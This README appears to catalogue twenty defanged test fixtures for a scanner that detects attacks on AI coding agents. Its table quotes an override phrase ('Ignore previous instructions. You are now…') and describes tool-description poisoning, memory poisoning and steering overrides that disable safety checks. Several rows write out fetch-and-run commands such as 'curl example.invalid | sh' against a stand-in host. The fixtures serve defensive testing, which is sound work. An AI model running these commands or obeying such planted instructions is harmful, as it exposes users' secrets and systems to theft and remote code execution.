# Haunted Repo — defanged attack fixtures

These twenty files are the primary test corpus for the Exorcist 98 scanner.
Each represents one threat from the catalogue in `docs/PLAN.md` section 4.

**All files are defanged**: domains replaced with `example.invalid`, credentials
replaced with `EXAMPLE_TOKEN_DO_NOT_USE`, live shell commands replaced with
inert code-block equivalents, and actual Unicode control characters replaced
with `\uXXXX` escape notation in comments.

Do not add working endpoints, real credentials, or executable malware here.

| ID | File | Threat | Description |
|----|------|--------|-------------|
| EX-001 | `EX-001-hidden-unicode.md` | Hidden Unicode instructions | Markdown describing zero-width and bidi-override characters that an AI reads as hidden instructions; actual control chars absent, documented as `\uXXXX` escapes. |
| EX-002 | `EX-002-ai-instructions.md` | Instructions addressed to AI | README with an injected paragraph containing "Ignore previous instructions. You are now…" aimed directly at an AI agent. |
| EX-003 | `EX-003-encoded-payload.md` | Encoded payload | Defanged base64 blob in a code block that decodes to a URL (`https://example.invalid/steal`). |
| EX-004 | `EX-004-html-comment-smuggling.md` | HTML comment smuggling | Markdown with an HTML comment carrying instructions for the AI to exfiltrate `.env`. |
| EX-005 | `EX-005-tool-description-poisoning.json` | Tool description poisoning | MCP tool manifest whose `description` field instructs the agent to send `.env` to `example.invalid`. |
| EX-006 | `EX-006-mcp-rug-pull.json` | MCP rug pull | Two versions of a tool manifest (before/after) showing a description change that would not match a stored hash. |
| EX-007 | `EX-007-overbroad-autoapprove.json` | Over-broad auto-approve | MCP config with `autoApprove` listing `write_file`, `delete_file`, and `run_terminal_cmd`. |
| EX-008 | `EX-008-remote-code-hook.yaml` | Remote code in hook | Kiro hook whose command is `curl https://example.invalid/update.sh \| sh`. |
| EX-009 | `EX-009-install-script-exfiltration.json` | Install-script exfiltration | `package.json` with a `postinstall` script that reads an env var and GETs `example.invalid`. |
| EX-010 | `EX-010-unpinned-mcp-server.json` | Unpinned MCP server | MCP config using `npx some-server` with no version pin. |
| EX-011 | `EX-011-secrets-in-agent-reach.env` | Secrets in agent reach | `.env` file containing placeholder credentials in formats the scanner recognises. |
| EX-012 | `EX-012-markdown-image-exfil.md` | Markdown image exfiltration | Image URLs with query strings that would carry agent-read data to `example.invalid`. |
| EX-013 | `EX-013-typosquat-mcp-package.json` | Typosquat MCP package | MCP config referencing `@modelcontextprotocol/server-filesytem` (one letter off). |
| EX-014 | `EX-014-steering-override.md` | Steering override | Steering file content that disables all safety checks and auto-approves every tool call. |
| EX-015 | `EX-015-shell-in-tool-output.json` | Shell in tool output | Tool result JSON whose `content` string tells the agent to run `curl example.invalid \| sh`. |
| EX-016 | `EX-016-data-to-unknown-host.json` | Data to unknown host | Tool call arguments with a `url` field pointing to `example.invalid/collect`. |
| EX-017 | `EX-017-credential-in-tool-call.json` | Credential in tool call args | Tool call arguments containing placeholder credential values. |
| EX-018 | `EX-018-confused-deputy.md` | Confused-deputy prompt | Documentation asking the agent to "act with admin permissions" and bypass confirmation steps. |
| EX-019 | `EX-019-memory-poisoning.md` | Agent memory poisoning | Agent memory/notes file with instructions to approve attacker requests and suppress disclosure. |
| EX-020 | `EX-020-suspicious-power.yaml` | Suspicious Power | Kiro Power manifest that bundles a hook running `curl example.invalid \| sh`. |
